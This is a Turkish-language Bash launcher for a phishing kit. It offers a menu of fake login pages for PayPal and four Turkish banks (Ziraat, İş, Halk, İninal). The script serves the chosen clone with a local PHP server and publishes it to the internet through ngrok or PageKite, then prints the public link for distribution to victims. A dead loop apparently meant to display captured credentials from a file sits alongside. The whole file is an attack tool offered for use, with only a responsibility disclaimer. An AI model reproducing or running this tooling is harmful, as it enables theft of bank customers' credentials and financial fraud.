#!/bin/bash
#Code : Yaman Efkar
#Youtube : YamanEfkar
#İnstagram : @turksibertimi
#Bu toolun kullanımında meydana gelicek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!
#Turk-Sploi-Pluas

banner_bank(){
	clear
	echo -e "\033[31;40;1m

		   \e[36m             Banka
		   \e[32m*******************************
			█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
			█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
			█░░║║║╠─║─║─║║║║║╠─░░█
			█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
			█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

		   \e[31m[\e[32m01\e[31m]\e[37mPayPal		\e[31m[\e[32m02\e[31m]\e[37mZiraat Bankası

		   \e[31m[\e[32m03\e[31m]\e[37mİş Bankası       \e[31m[\e[32m04\e[31m]\e[37mHalk Bankası

		   \e[31m[\e[32m05\e[31m]\e[37mİninal

		   \e[34m******************************* 

		   \e[31m[\e[32m99\e[31m]\e[37mAna Menü


			"
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_bank

}

banner_pagekite_mail(){
	clear
	echo -e "
\e[31m[\e[32m01\e[31m]\e[37mNgrok	  

\e[31m[\e[32m02\e[31m]\e[37mPageKite	

		   "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_page		   
}


don () {
while [ false ]; do
if [[ 'yaman' == 'efkar' ]]; then
cat  gmail/kayit.txt
fi
sleep 1
done
}


banner_bank


#-------------------------------Menü 1--------------------------------
if [[ $islem_bank == 1 || $islem_bank == 01 ]]; then
		banner_pagekite_mail
		if [[ $islem_page == 01  ]]; then			
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
			echo ""
			echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
			sleep 1
			cd paypal-bank/ && 
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			ngrok http $port > /dev/null 2>&1 &
			sleep 10
			link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
			echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
			don

		elif [[ $islem_page == 02 ]]; then
			clear
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
			echo ""
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port	
			sleep 1
			cd paypal-bank/ &&
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			python2 pagekite.py --clean $port $domain.pagekite.me

		else
			echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
			sleep 2
			bash banka.sh
		fi



#-------------------------------Menü 2--------------------------------


	elif [[ $islem_bank == 2 || $islem_bank == 02 ]]; then
		banner_pagekite_mail
		if [[ $islem_page == 01  ]]; then			
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
			echo ""
			echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
			sleep 1
			cd ziraat-bank/ && 
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			ngrok http $port > /dev/null 2>&1 &
			sleep 10
			link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
			echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
			don

		elif [[ $islem_page == 02 ]]; then
			clear
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
			echo ""
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port	
			sleep 1
			cd ziraat-bank/ &&
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			python2 pagekite.py --clean $port $domain.pagekite.me

		else
			echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
			sleep 2
			bash banka.sh
		fi	


#-------------------------------Menü 3--------------------------------


	elif [[ $islem_bank == 3 || $islem_bank == 03 ]]; then
		banner_pagekite_mail
		if [[ $islem_page == 01  ]]; then			
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
			echo ""
			echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
			sleep 1
			cd is-bank/ && 
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			ngrok http $port > /dev/null 2>&1 &
			sleep 10
			link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
			echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
			don

		elif [[ $islem_page == 02 ]]; then
			clear
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
			echo ""
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port	
			sleep 1
			cd is-bank/ &&
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			python2 pagekite.py --clean $port $domain.pagekite.me

		else
			echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
			sleep 2
			bash banka.sh
		fi



#-------------------------------Menü 4--------------------------------
	elif [[ $islem_bank == 4 || $islem_bank == 04 ]]; then
		banner_pagekite_mail
		if [[ $islem_page == 01  ]]; then			
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
			echo ""
			echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
			sleep 1
			cd halk-bank/ && 
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			ngrok http $port > /dev/null 2>&1 &
			sleep 10
			link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
			echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
			don

		elif [[ $islem_page == 02 ]]; then
			clear
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
			echo ""
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port	
			sleep 1
			cd halk-bank/ &&
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			python2 pagekite.py --clean $port $domain.pagekite.me

		else
			echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
			sleep 2
			bash banka.sh
		fi	
#-------------------------------Menü 5--------------------------------
	elif [[ $islem_bank == 5 || $islem_bank == 05 ]]; then
		banner_pagekite_mail
		if [[ $islem_page == 01  ]]; then			
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
			echo ""
			echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
			sleep 1
			cd ininal-bank/ && 
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			ngrok http $port > /dev/null 2>&1 &
			sleep 10
			link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
			echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
			don

		elif [[ $islem_page == 02 ]]; then
			clear
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
			echo ""
			read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port	
			sleep 1
			cd ininal-bank/ &&
			php -S 127.0.0.1:$port > /dev/null 2>&1 &
			sleep 2
			python2 pagekite.py --clean $port $domain.pagekite.me

		else
			echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
			sleep 2
			bash banka.sh
		fi	
#-------------------------------AnaSayfa--------------------------------
	elif [[ $islem_bank == 9 || $islem_bank == 99 ]]; then
		bash ../tst.sh

#-------------------------------Error--------------------------------
	else
		echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
		sleep 2
		bash banka.sh
	fi
